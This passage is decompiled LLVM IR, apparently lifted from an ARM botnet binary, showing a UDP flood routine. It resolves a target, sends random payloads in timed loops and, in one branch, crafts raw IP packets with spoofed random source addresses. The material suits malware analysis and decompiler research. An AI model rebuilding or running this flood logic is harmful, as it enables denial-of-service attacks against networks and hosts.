  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_c794 = load i32, i32* @r4, align 4
  %v6_c794 = load i32, i32* @fp, align 4
  store i32 51100, i32* %stack_var_-4, align 4
  %v2_c798 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c798, i32* @fp, align 4
  %v2_c79c = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_c7c4 = icmp eq i32 %arg2, 0
  br i1 %v2_c7c4, label %dec_label_pc_c7cc, label %dec_label_pc_c7ec

dec_label_pc_c7cc:                                ; preds = %entry
  %v0_c7cc = call i32 @rand_cmwc()
  %v3_c7d4 = mul i32 %v0_c7cc, 65536
  store i32 %v3_c7d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c810

dec_label_pc_c7ec:                                ; preds = %entry
  %v3_c7f4 = urem i32 %arg2, 65536
  store i32 %v3_c7f4, i32* %r3.global-to-local, align 4
  %v1_c7fc = call i32 @htons(i32 %v3_c7f4)
  br label %dec_label_pc_c810

dec_label_pc_c810:                                ; preds = %dec_label_pc_c7cc, %dec_label_pc_c7ec
  %v2_c814 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_c814, i32* %r3.global-to-local, align 4
  %v3_c820 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_c820, i32* %r3.global-to-local, align 4
  %v2_c828 = icmp eq i32 %v3_c820, 0
  br i1 %v2_c828, label %dec_label_pc_c830, label %dec_label_pc_ce44

dec_label_pc_c830:                                ; preds = %dec_label_pc_c810
  %v2_c830 = ptrtoint i32* %stack_var_-76 to i32
  %v2_c834 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_c834, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_c854 = icmp eq i32 %arg4, 32
  br i1 %v7_c854, label %dec_label_pc_c85c, label %dec_label_pc_c9d8

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c830
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_c868 = call i32 @socket()
  store i32 %v0_c868, i32* %r3.global-to-local, align 4
  %v2_c878 = icmp eq i32 %v0_c868, 0
  br i1 %v2_c878, label %dec_label_pc_ce44, label %dec_label_pc_c880

dec_label_pc_c880:                                ; preds = %dec_label_pc_c85c
  %v3_c880 = load i32, i32* %stack_var_0, align 4
  %v1_c884 = add i32 %v3_c880, 1
  store i32 %v1_c884, i32* %r3.global-to-local, align 4
  %v1_c88c = call i32 @malloc(i32 %v1_c884)
  store i32 %v1_c88c, i32* %r3.global-to-local, align 4
  %v2_c89c = icmp eq i32 %v1_c88c, 0
  br i1 %v2_c89c, label %dec_label_pc_ce44, label %dec_label_pc_c8a4

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c880
  %v3_c8a4 = load i32, i32* %stack_var_0, align 4
  %v1_c8a8 = add i32 %v3_c8a4, 1
  store i32 %v1_c8a8, i32* @r2, align 4
  store i32 %v1_c88c, i32* %r3.global-to-local, align 4
  %v2_c8bc = inttoptr i32 %v1_c88c to i8*
  %v3_c8bc = call i32 @__GI_memset(i8* %v2_c8bc, i32 0)
  %v2_c8c8 = call i32 @makeRandomStr(i32 %v1_c88c, i32 %v3_c8a4)
  %v2_c8d0 = call i32 @__GI_time(i32* null)
  %v2_c8dc = add i32 %v2_c8d0, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_c91c = inttoptr i32 %v1_c88c to i32*
  %v3_c9a0 = mul i32 %arg8, 4
  %v3_c9b0 = mul i32 %arg8, 1000
  br label %dec_label_pc_c8f8.outer

dec_label_pc_c8f8.outer:                          ; preds = %dec_label_pc_c9c8, %dec_label_pc_c998, %dec_label_pc_c8a4
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_c8a4 ], [ %v1_c9cc, %dec_label_pc_c9c8 ], [ 0, %dec_label_pc_c998 ]
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_c8a4 ], [ %v1_c980, %dec_label_pc_c9c8 ], [ %v1_c980, %dec_label_pc_c998 ]
  br label %dec_label_pc_c8f8

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8f8.outer, %dec_label_pc_c970
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_c970 ], [ %stack_var_-112.0.ph, %dec_label_pc_c8f8.outer ]
  %v3_c8f8 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_c830, i32* %stack_var_-144, align 4
  store i32 %v3_c8f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_c91c = call i32 @__libc_sendto(i32 %v0_c868, i32* %v6_c91c, i32 %v3_c8f8, i32 0, i32 %v2_c830, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_c928 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_c928, label %dec_label_pc_c930, label %dec_label_pc_c97c

dec_label_pc_c930:                                ; preds = %dec_label_pc_c8f8
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c7c4, label %dec_label_pc_c93c, label %dec_label_pc_c958

dec_label_pc_c93c:                                ; preds = %dec_label_pc_c930
  %v0_c93c = call i32 @rand_cmwc()
  %v3_c948 = udiv i32 %v0_c93c, 256
  %v3_c9505 = urem i32 %v3_c948, 256
  store i32 %v3_c9505, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %dec_label_pc_c930, %dec_label_pc_c93c
  %v2_c95c = call i32 @__GI_time(i32* null)
  store i32 %v2_c95c, i32* %r2.global-to-local, align 4
  store i32 %v2_c8dc, i32* %r3.global-to-local, align 4
  %v8_c96c = icmp sgt i32 %v2_c95c, %v2_c8dc
  br i1 %v8_c96c, label %dec_label_pc_ce44, label %dec_label_pc_c970

dec_label_pc_c970:                                ; preds = %dec_label_pc_c958
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c8f8

dec_label_pc_c97c:                                ; preds = %dec_label_pc_c8f8
  %v1_c980 = add i32 %stack_var_-112.0, 1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_c990 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_c990, label %dec_label_pc_c998, label %dec_label_pc_c9c8

dec_label_pc_c998:                                ; preds = %dec_label_pc_c97c
  store i32 %v3_c9a0, i32* %r2.global-to-local, align 4
  store i32 %v3_c9b0, i32* %r3.global-to-local, align 4
  %v1_c9b8 = call i32 @usleep(i32 %v3_c9b0)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c8f8.outer

dec_label_pc_c9c8:                                ; preds = %dec_label_pc_c97c
  %v1_c9cc = add i32 %stack_var_-108.0.ph, 1
  br label %dec_label_pc_c8f8.outer

dec_label_pc_c9d8:                                ; preds = %dec_label_pc_c830
  store i32 %v2_c79c, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_c9ec = call i32 @socket()
  store i32 %v0_c9ec, i32* %r3.global-to-local, align 4
  %v2_c9fc = icmp eq i32 %v0_c9ec, 0
  br i1 %v2_c9fc, label %dec_label_pc_ce40, label %dec_label_pc_ca08

dec_label_pc_ca08:                                ; preds = %dec_label_pc_c9d8
  store i32 1, i32* %stack_var_-80, align 4
  %v2_ca10 = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-144, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_ca10, i32* %r3.global-to-local, align 4
  %v6_ca2c = call i32 @__GI_setsockopt(i32 %v0_c9ec, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_ca2c, i32* %r3.global-to-local, align 4
  %v1_ca34 = icmp slt i32 %v6_ca2c, 0
  br i1 %v1_ca34, label %dec_label_pc_ce40, label %dec_label_pc_ca40

dec_label_pc_ca40:                                ; preds = %dec_label_pc_ca08
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ca4c

dec_label_pc_ca4c:                                ; preds = %dec_label_pc_ca40, %dec_label_pc_ca4c
  %v1_ca8426 = phi i32 [ 49, %dec_label_pc_ca40 ], [ %v1_ca84, %dec_label_pc_ca4c ]
  %v2_ca50 = call i32 @__GI_time(i32* null)
  store i32 %v2_ca50, i32* %r3.global-to-local, align 4
  store i32 %v2_ca50, i32* @r4, align 4
  %v0_ca5c = call i32 @rand_cmwc()
  %v0_ca64 = load i32, i32* @r4, align 4
  %v2_ca64 = xor i32 %v0_ca64, %v0_ca5c
  store i32 %v2_ca64, i32* %r3.global-to-local, align 4
  %v1_ca6c = call i32 @srand(i32 %v2_ca64)
  %v0_ca70 = call i32 @random()
  store i32 %v0_ca70, i32* %r3.global-to-local, align 4
  %v1_ca7c = call i32 @init_rand(i32 %v0_ca70)
  %v1_ca84 = add nsw i32 %v1_ca8426, -1
  store i32 %v1_ca84, i32* %r3.global-to-local, align 4
  %v3_ca90 = icmp eq i32 %v1_ca8426, 0
  br i1 %v3_ca90, label %dec_label_pc_ca98, label %dec_label_pc_ca4c

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca4c
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_ca9c = icmp eq i32 %arg4, 0
  br i1 %v2_ca9c, label %dec_label_pc_cac8, label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_ca98
  %v1_cab4 = sub i32 32, %arg4
  store i32 %v1_cab4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_cac0 = shl i32 -1, %v1_cab4
  br label %dec_label_pc_cac8

dec_label_pc_cac8:                                ; preds = %dec_label_pc_ca98, %dec_label_pc_cab0
  %storemerge12 = phi i32 [ %v1_cac0, %dec_label_pc_cab0 ], [ 0, %dec_label_pc_ca98 ]
  %v3_cac8 = load i32, i32* %stack_var_0, align 4
  %v1_cacc = add i32 %v3_cac8, 28
  %v1_cadc = add i32 %v3_cac8, 34
  %v3_cae0 = and i32 %v1_cadc, -4
  %v1_cae8 = load i32, i32* @sp, align 4
  %v2_cae8 = sub i32 %v1_cae8, %v3_cae0
  %v1_caf8 = add i32 %v2_cae8, 11
  %v3_cafc = and i32 %v1_caf8, -4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cb1c = add i32 %v3_cafc, 20
  store i32 %v1_cb1c, i32* %r3.global-to-local, align 4
  %v5_cb20 = inttoptr i32 %v1_cb1c to i8*
  %v3_cb24 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_cb24, i32* @r4, align 4
  %v1_cb2c = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_cb2c, i32* %r3.global-to-local, align 4
  %v1_cb38 = call i32 @htonl(i32 %v1_cb2c)
  store i32 %v1_cb38, i32* %r2.global-to-local, align 4
  %v3_cb40 = load i32, i32* %stack_var_0, align 4
  %v1_cb44 = add i32 %v3_cb40, 8
  %v1_cb48 = load i32, i32* @sp, align 4
  %v2_cb48 = inttoptr i32 %v1_cb48 to i32*
  store i32 %v1_cb44, i32* %v2_cb48, align 4
  %v0_cb50 = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_cb58 = inttoptr i32 %v3_cafc to i8*
  %v5_cb58 = call i32 @makeIPPacket(i8* %v4_cb58, i32 %v0_cb50, i32 %v1_cb38, i32 17)
  %v3_cb5c = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_cb5c, 8
  %v3_cb70 = urem i32 %fold, 65536
  store i32 %v3_cb70, i32* %r3.global-to-local, align 4
  %v1_cb78 = call i32 @htons(i32 %v3_cb70)
  %sext = mul i32 %v1_cb78, 16777216
  %v1_cb7c = sdiv i32 %sext, 16777216
  store i32 %v1_cb7c, i32* %r3.global-to-local, align 4
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v1_cb84 = trunc i32 %v1_cb7c to i8
  %v3_cb84 = add i32 %v3_cafc, 24
  %v4_cb84 = inttoptr i32 %v3_cb84 to i8*
  store i8 %v1_cb84, i8* %v4_cb84, align 4
  %v0_cb88 = load i32, i32* %r3.global-to-local, align 4
  %v3_cb88 = sdiv i32 %v0_cb88, 256
  store i32 %v3_cb88, i32* %r3.global-to-local, align 4
  %v1_cb8c = trunc i32 %v3_cb88 to i8
  %v2_cb8c = load i32, i32* %r2.global-to-local, align 4
  %v3_cb8c = add i32 %v2_cb8c, 5
  %v4_cb8c = inttoptr i32 %v3_cb8c to i8*
  store i8 %v1_cb8c, i8* %v4_cb8c, align 1
  %v0_cb90 = call i32 @rand_cmwc()
  %v3_cb9c = urem i32 %v0_cb90, 65536
  store i32 %v3_cb9c, i32* %r3.global-to-local, align 4
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v1_cba4 = trunc i32 %v0_cb90 to i8
  store i8 %v1_cba4, i8* %v5_cb20, align 4
  %v0_cba8 = load i32, i32* %r3.global-to-local, align 4
  %v3_cba836 = udiv i32 %v0_cba8, 256
  %v1_cbac = trunc i32 %v3_cba836 to i8
  %v2_cbac = load i32, i32* %r2.global-to-local, align 4
  %v3_cbac = add i32 %v2_cbac, 1
  %v4_cbac = inttoptr i32 %v3_cbac to i8*
  store i8 %v1_cbac, i8* %v4_cbac, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c7c4, label %dec_label_pc_cbbc, label %dec_label_pc_cbd4

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cac8
  %v0_cbbc = call i32 @rand_cmwc()
  %v3_cbc4 = mul i32 %v0_cbbc, 65536
  store i32 %v3_cbc4, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_cbbc to i8
  br label %dec_label_pc_cbf0

dec_label_pc_cbd4:                                ; preds = %dec_label_pc_cac8
  %v3_cbdc = urem i32 %arg2, 65536
  store i32 %v3_cbdc, i32* %r3.global-to-local, align 4
  %v1_cbe4 = call i32 @htons(i32 %v3_cbdc)
  %extract.t102 = trunc i32 %v1_cbe4 to i8
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbbc, %dec_label_pc_cbd4
  %v0_cbbc.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_cbbc ], [ %extract.t102, %dec_label_pc_cbd4 ]
  %v3_cd08.pre-phi = phi i32 [ 0, %dec_label_pc_cbbc ], [ %v3_cbdc, %dec_label_pc_cbd4 ]
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v4_cbf4 = sext i8 %v0_cbbc.sink.off0 to i32
  %v3_cbf8 = add i32 %v3_cafc, 22
  %v4_cbf8 = inttoptr i32 %v3_cbf8 to i8*
  store i8 %v0_cbbc.sink.off0, i8* %v4_cbf8, align 2
  %v3_cc0040 = udiv i32 %v4_cbf4, 256
  %v1_cc04 = trunc i32 %v3_cc0040 to i8
  %v2_cc04 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc04 = add i32 %v2_cc04, 3
  %v4_cc04 = inttoptr i32 %v3_cc04 to i8*
  store i8 %v1_cc04, i8* %v4_cc04, align 1
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cc10 = add i32 %v3_cafc, 26
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 2
  %v0_cc14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc14 = trunc i32 %v0_cc14 to i8
  %v2_cc14 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc14 = add i32 %v2_cc14, 7
  %v4_cc14 = inttoptr i32 %v3_cc14 to i8*
  store i8 %v1_cc14, i8* %v4_cc14, align 1
  %v1_cc1c = add i32 %v3_cafc, 28
  store i32 %v1_cc1c, i32* %r3.global-to-local, align 4
  %v3_cc24 = load i32, i32* %stack_var_0, align 4
  %v2_cc28 = call i32 @makeRandomStr(i32 %v1_cc1c, i32 %v3_cc24)
  %v1_cc38 = or i32 %v3_cafc, 2
  store i32 %v1_cc38, i32* %r3.global-to-local, align 4
  %v1_cc3c = inttoptr i32 %v1_cc38 to i8*
  %v2_cc3c = load i8, i8* %v1_cc3c, align 2
  %v3_cc3c = zext i8 %v2_cc3c to i32
  store i32 %v3_cc3c, i32* %r2.global-to-local, align 4
  %v1_cc40 = or i32 %v1_caf8, 3
  %v2_cc40 = inttoptr i32 %v1_cc40 to i8*
  %v3_cc40 = load i8, i8* %v2_cc40, align 1
  %v4_cc40 = zext i8 %v3_cc40 to i32
  %v4_cc44 = mul nuw nsw i32 %v4_cc40, 256
  %v5_cc44 = or i32 %v4_cc44, %v3_cc3c
  store i32 %v5_cc44, i32* %r3.global-to-local, align 4
  %v3_cc50 = call i32 @csum(i8* %v4_cb58, i32 %v5_cc44)
  %sext6 = mul i32 %v3_cc50, 16777216
  %v1_cc54 = sdiv i32 %sext6, 16777216
  store i32 %v1_cc54, i32* %r3.global-to-local, align 4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cc5c = trunc i32 %v1_cc54 to i8
  %v3_cc5c = add i32 %v3_cafc, 10
  %v4_cc5c = inttoptr i32 %v3_cc5c to i8*
  store i8 %v1_cc5c, i8* %v4_cc5c, align 2
  %v0_cc60 = load i32, i32* %r3.global-to-local, align 4
  %v3_cc60 = sdiv i32 %v0_cc60, 256
  store i32 %v3_cc60, i32* %r3.global-to-local, align 4
  %v1_cc64 = trunc i32 %v3_cc60 to i8
  %v2_cc64 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc64 = add i32 %v2_cc64, 11
  %v4_cc64 = inttoptr i32 %v3_cc64 to i8*
  store i8 %v1_cc64, i8* %v4_cc64, align 1
  %v2_cc6c = call i32 @__GI_time(i32* null)
  %v2_cc78 = add i32 %v2_cc6c, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cd48 = add i32 %v3_cafc, 4
  %v4_cd48 = inttoptr i32 %v3_cd48 to i8*
  %v2_cd70 = add i32 %v3_cafc, 12
  %v3_cd70 = inttoptr i32 %v2_cd70 to i32*
  %v3_ce08 = mul i32 %arg8, 4
  %v3_ce18 = mul i32 %arg8, 1000
  br label %dec_label_pc_cc94.outer

dec_label_pc_cc94.outer:                          ; preds = %dec_label_pc_ce30, %dec_label_pc_ce00, %dec_label_pc_cbf0
  %stack_var_-104.0.ph = phi i32 [ 0, %dec_label_pc_cbf0 ], [ %v1_cde8, %dec_label_pc_ce00 ], [ %v1_cde8, %dec_label_pc_ce30 ]
  %stack_var_-100.0.ph = phi i32 [ 0, %dec_label_pc_cbf0 ], [ 0, %dec_label_pc_ce00 ], [ %v1_ce34, %dec_label_pc_ce30 ]
  br label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc94.outer, %dec_label_pc_cdd8
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_cdd8 ], [ %stack_var_-104.0.ph, %dec_label_pc_cc94.outer ]
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cc9c = load i32, i32* @sp, align 4
  %v2_cc9c = inttoptr i32 %v1_cc9c to i32*
  store i32 %v2_c830, i32* %v2_cc9c, align 4
  %v1_cca4 = load i32, i32* @sp, align 4
  %v2_cca4 = add i32 %v1_cca4, 4
  %v3_cca4 = inttoptr i32 %v2_cca4 to i32*
  store i32 16, i32* %v3_cca4, align 4
  %v0_ccac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cacc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_ccb8 = inttoptr i32 %v0_ccac to i32*
  %v7_ccb8 = call i32 @__libc_sendto(i32 %v0_c9ec, i32* %v6_ccb8, i32 %v1_cacc, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_ccbc = call i32 @rand_cmwc()
  %v3_ccc8 = urem i32 %v0_ccbc, 65536
  store i32 %v3_ccc8, i32* %r3.global-to-local, align 4
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v1_ccd0 = trunc i32 %v0_ccbc to i8
  store i8 %v1_ccd0, i8* %v5_cb20, align 4
  %v0_ccd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_ccd441 = udiv i32 %v0_ccd4, 256
  %v1_ccd8 = trunc i32 %v3_ccd441 to i8
  %v2_ccd8 = load i32, i32* %r2.global-to-local, align 4
  %v3_ccd8 = add i32 %v2_ccd8, 1
  %v4_ccd8 = inttoptr i32 %v3_ccd8 to i8*
  store i8 %v1_ccd8, i8* %v4_ccd8, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c7c4, label %dec_label_pc_cce8, label %dec_label_pc_cd00

dec_label_pc_cce8:                                ; preds = %dec_label_pc_cc94
  %v0_cce8 = call i32 @rand_cmwc()
  %v3_ccf0 = mul i32 %v0_cce8, 65536
  store i32 %v3_ccf0, i32* %r3.global-to-local, align 4
  %extract.t103 = trunc i32 %v0_cce8 to i8
  br label %dec_label_pc_cd1c

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  store i32 %v3_cd08.pre-phi, i32* %r3.global-to-local, align 4
  %v1_cd10 = call i32 @htons(i32 %v3_cd08.pre-phi)
  %extract.t104 = trunc i32 %v1_cd10 to i8
  br label %dec_label_pc_cd1c

dec_label_pc_cd1c:                                ; preds = %dec_label_pc_cce8, %dec_label_pc_cd00
  %v0_cce8.sink.off0 = phi i8 [ %extract.t103, %dec_label_pc_cce8 ], [ %extract.t104, %dec_label_pc_cd00 ]
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v4_cd20 = sext i8 %v0_cce8.sink.off0 to i32
  store i8 %v0_cce8.sink.off0, i8* %v4_cbf8, align 2
  %v3_cd2c = sdiv i32 %v4_cd20, 256
  store i32 %v3_cd2c, i32* %r3.global-to-local, align 4
  %v1_cd30 = trunc i32 %v3_cd2c to i8
  %v2_cd30 = load i32, i32* %r2.global-to-local, align 4
  %v3_cd30 = add i32 %v2_cd30, 3
  %v4_cd30 = inttoptr i32 %v3_cd30 to i8*
  store i8 %v1_cd30, i8* %v4_cd30, align 1
  %v0_cd34 = call i32 @rand_cmwc()
  %v3_cd40 = urem i32 %v0_cd34, 65536
  store i32 %v3_cd40, i32* %r3.global-to-local, align 4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cd48 = trunc i32 %v0_cd34 to i8
  store i8 %v1_cd48, i8* %v4_cd48, align 4
  %v0_cd4c = load i32, i32* %r3.global-to-local, align 4
  %v3_cd4c = sdiv i32 %v0_cd4c, 256
  store i32 %v3_cd4c, i32* %r3.global-to-local, align 4
  %v1_cd50 = trunc i32 %v3_cd4c to i8
  %v2_cd50 = load i32, i32* %r2.global-to-local, align 4
  %v3_cd50 = add i32 %v2_cd50, 5
  %v4_cd50 = inttoptr i32 %v3_cd50 to i8*
  store i8 %v1_cd50, i8* %v4_cd50, align 1
  %v1_cd58 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_cd58, i32* %r3.global-to-local, align 4
  %v1_cd64 = call i32 @htonl(i32 %v1_cd58)
  store i32 %v1_cd64, i32* %r2.global-to-local, align 4
  store i32 %v1_cd64, i32* %v3_cd70, align 4
  store i32 %v1_cc38, i32* %r3.global-to-local, align 4
  %v2_cd84 = load i8, i8* %v1_cc3c, align 2
  %v3_cd84 = zext i8 %v2_cd84 to i32
  store i32 %v3_cd84, i32* %r2.global-to-local, align 4
  %v3_cd88 = load i8, i8* %v2_cc40, align 1
  %v4_cd88 = zext i8 %v3_cd88 to i32
  %v4_cd8c = mul nuw nsw i32 %v4_cd88, 256
  %v5_cd8c = or i32 %v4_cd8c, %v3_cd84
  store i32 %v5_cd8c, i32* %r3.global-to-local, align 4
  %v3_cd98 = call i32 @csum(i8* %v4_cb58, i32 %v5_cd8c)
  %sext7 = mul i32 %v3_cd98, 16777216
  %v1_cd9c = sdiv i32 %sext7, 16777216
  store i32 %v1_cd9c, i32* %r3.global-to-local, align 4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cda4 = trunc i32 %v1_cd9c to i8
  store i8 %v1_cda4, i8* %v4_cc5c, align 2
  %v0_cda8 = load i32, i32* %r3.global-to-local, align 4
  %v3_cda845 = udiv i32 %v0_cda8, 256
  %v1_cdac = trunc i32 %v3_cda845 to i8
  %v2_cdac = load i32, i32* %r2.global-to-local, align 4
  %v3_cdac = add i32 %v2_cdac, 11
  %v4_cdac = inttoptr i32 %v3_cdac to i8*
  store i8 %v1_cdac, i8* %v4_cdac, align 1
  store i32 %stack_var_-104.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_cdb8 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_cdb8, label %dec_label_pc_cdc0, label %dec_label_pc_cde4

dec_label_pc_cdc0:                                ; preds = %dec_label_pc_cd1c
  %v2_cdc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_cdc4, i32* %r2.global-to-local, align 4
  store i32 %v2_cc78, i32* %r3.global-to-local, align 4
  %v8_cdd4 = icmp sgt i32 %v2_cdc4, %v2_cc78
  br i1 %v8_cdd4, label %dec_label_pc_ce40, label %dec_label_pc_cdd8

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cdc0
  br label %dec_label_pc_cc94

dec_label_pc_cde4:                                ; preds = %dec_label_pc_cd1c
  %v1_cde8 = add i32 %stack_var_-104.0, 1
  store i32 %v1_cde8, i32* %r2.global-to-local, align 4
  store i32 %arg7, i32* %r3.global-to-local, align 4
  %v9_cdf8 = icmp eq i32 %stack_var_-100.0.ph, %arg7
  br i1 %v9_cdf8, label %dec_label_pc_ce00, label %dec_label_pc_ce30

dec_label_pc_ce00:                                ; preds = %dec_label_pc_cde4
  store i32 %v3_ce08, i32* %r2.global-to-local, align 4
  store i32 %v3_ce18, i32* %r3.global-to-local, align 4
  %v1_ce20 = call i32 @usleep(i32 %v3_ce18)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cc94.outer

dec_label_pc_ce30:                                ; preds = %dec_label_pc_cde4
  %v1_ce34 = add i32 %stack_var_-100.0.ph, 1
  store i32 %v1_ce34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cc94.outer

dec_label_pc_ce40:                                ; preds = %dec_label_pc_cdc0, %dec_label_pc_ca08, %dec_label_pc_c9d8
  %v12_ce4833 = phi i32 [ %v6_ca2c, %dec_label_pc_ca08 ], [ 0, %dec_label_pc_c9d8 ], [ %v2_cdc4, %dec_label_pc_cdc0 ]
  br label %dec_label_pc_ce44

dec_label_pc_ce44:                                ; preds = %dec_label_pc_c958, %dec_label_pc_c810, %dec_label_pc_c880, %dec_label_pc_c85c, %dec_label_pc_ce40
  %v12_ce48 = phi i32 [ %v3_c820, %dec_label_pc_c810 ], [ 0, %dec_label_pc_c880 ], [ 0, %dec_label_pc_c85c ], [ %v12_ce4833, %dec_label_pc_ce40 ], [ %v2_c95c, %dec_label_pc_c958 ]
  store i32 %v3_c794, i32* @r4, align 4
  store i32 %v6_c794, i32* @fp, align 4
  ret i32 %v12_ce48

; uselistorder directives
  uselistorder i32 %v1_ce34, { 1, 0 }
  uselistorder i32 %v1_cde8, { 2, 1, 0 }
  uselistorder i32 %v1_cd9c, { 1, 0 }
  uselistorder i32 %v3_cd4c, { 1, 0 }
  uselistorder i32 %v0_cd34, { 1, 0 }
  uselistorder i32 %v3_cd2c, { 1, 0 }
  uselistorder i8 %v0_cce8.sink.off0, { 1, 0 }
  uselistorder i32 %v0_cce8, { 1, 0 }
  uselistorder i32 %v0_ccbc, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v3_ce18, { 1, 0 }
  uselistorder i32 %v2_cc78, { 1, 0 }
  uselistorder i32 %v3_cc60, { 1, 0 }
  uselistorder i32 %v1_cc54, { 1, 0 }
  uselistorder i32 %v1_cc38, { 0, 2, 1 }
  uselistorder i32 %v3_cd08.pre-phi, { 1, 0 }
  uselistorder i8 %v0_cbbc.sink.off0, { 1, 0 }
  uselistorder i32 %v3_cbdc, { 2, 1, 0 }
  uselistorder i32 %v0_cbbc, { 1, 0 }
  uselistorder i32 %v0_cb90, { 1, 0 }
  uselistorder i32 %v3_cb88, { 1, 0 }
  uselistorder i32 %v1_cb7c, { 1, 0 }
  uselistorder i32 %v3_cb70, { 1, 0 }
  uselistorder i32 %v3_cafc, { 9, 7, 5, 8, 6, 3, 4, 14, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_cacc, { 1, 0 }
  uselistorder i32 %v1_ca84, { 1, 0 }
  uselistorder i32 %v1_c980, { 1, 0 }
  uselistorder i32 %v3_c8f8, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v3_c9b0, { 1, 0 }
  uselistorder i32 %v2_c8dc, { 1, 0 }
  uselistorder i32 %v1_c88c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_c830, { 1, 0, 2 }
